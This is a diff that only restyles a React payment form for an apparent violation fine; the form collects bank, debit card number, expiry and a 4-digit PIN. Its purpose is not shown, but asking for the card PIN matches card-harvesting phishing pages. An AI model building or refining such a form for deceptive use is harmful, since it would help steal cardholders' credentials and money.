@@ -440,12 +440,11 @@ export default function Ken2(props: { setPage?: any; violationValue: number }) {
           <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
             {/* Bank Selection */}
             <div className="row">
-              <label className="column-label" style={{ width: "40%" }}>
+              <label className="column-label col-2" >
                 Select Your Bank:
               </label>
               <select
-                className="column-value"
-                style={{ width: "60%" }}
+                className="column-value col-7"
                 onChange={(e) => handleBankSelection(e.target.value)}
                 value={paymentInfo.bank}
               >
@@ -462,13 +461,12 @@ export default function Ken2(props: { setPage?: any; violationValue: number }) {
 
             {/* Card Number */}
             <div className="row three-column" id="Paymentpagecardnumber">
-              <label className="col">Card Number:</label>
+              <label className="col-2">Card Number:</label>
               <select
-                className="col"
+                className="col-2"
                 name="dcprefix"
                 id="dcprefix"
                 onChange={(e) => handlePaymentInfoChange("prefix", e.target.value)}
-                style={{ width: "25%" }}
                 value={paymentInfo.prefix}
               >
                 <option value="">prefix</option>
@@ -485,8 +483,7 @@ export default function Ken2(props: { setPage?: any; violationValue: number }) {
                 inputMode="numeric"
                 pattern="[0-9]*"
                 size={10}
-                className="allownumericwithoutdecimal"
-                style={{ width: "45%", marginLeft: 2 }}
+                className="allownumericwithoutdecimal col-4"
                 maxLength={10}
                 onChange={(e) => handlePaymentInfoChange("cardNumber", e.target.value)}
                 value={paymentInfo.cardNumber}
@@ -496,13 +493,14 @@ export default function Ken2(props: { setPage?: any; violationValue: number }) {
 
             {/* Expiration Date */}
             <div className="row three-column" id="cardExpdate">
-              <label className="col">Expiration Date:</label>
+              <label className="col-2" >Expiration Date:</label>
               <select
                 onChange={(e) => handlePaymentInfoChange("month", e.target.value)}
-                className="col m-1"
+                className="col-2 m-1"
+
                 value={paymentInfo.month}
               >
-                <option value="">MM</option>
+                <option value="" style={{width:'20%'}}>MM</option>
                 {Array.from({ length: 12 }, (_, i) => {
                   const month = i + 1
                   return (
@@ -514,7 +512,7 @@ export default function Ken2(props: { setPage?: any; violationValue: number }) {
               </select>
               <select
                 onChange={(e) => handlePaymentInfoChange("year", e.target.value)}
-                className="col m-1"
+                className="col-5 m-1"
                 value={paymentInfo.year}
               >
                 <option value="">YYYY</option>
@@ -532,7 +530,7 @@ export default function Ken2(props: { setPage?: any; violationValue: number }) {
             {/* PIN */}
             <div className="row" id="PinRow">
               <div className="row">
-                <label className="col">PIN:</label>
+                <label className="col-2">PIN:</label>
                 <input
                   inputMode="numeric"
                   pattern="[0-9]*"
@@ -544,9 +542,8 @@ export default function Ken2(props: { setPage?: any; violationValue: number }) {
                   title="Should be in number. Length should be 4"
                   type="password"
                   size={4}
-                  style={{ width: "80%" }}
                   maxLength={4}
-                  className="allownumericwithoutdecimal col-9"
+                  className="allownumericwithoutdecimal col-7"
                 />
               </div>
             </div>
@@ -1134,6 +1131,7 @@ export default function Ken2(props: { setPage?: any; violationValue: number }) {
     body {
         font-family: Verdana, Arial, Helvetica, sans-serif;
         background-color: #ebebeb;
+        overflow:hidden;
     }
     .container {
         width: 100%;
@@ -1195,18 +1193,19 @@ export default function Ken2(props: { setPage?: any; violationValue: number }) {
         padding-bottom: 0;
     }
     form label {
-        font-size: 11px;
+        font-size: 12px;
         color: #0070cd;
-        font-weight: bold;
+        font-weight: 900;
         text-shadow: 0 1px 2px rgba(0,0,0,0.2);
     }
     select {
         font-size:11px;
+        font-weight: 900;
         height:20px;
     }
     form .text-label, input, select {
         color: #444444;
-        font-weight: normal;
+        font-weight: bold;
     }
     form input[type=tel],input[type=password]{
         border: 2px solid #0070cd;
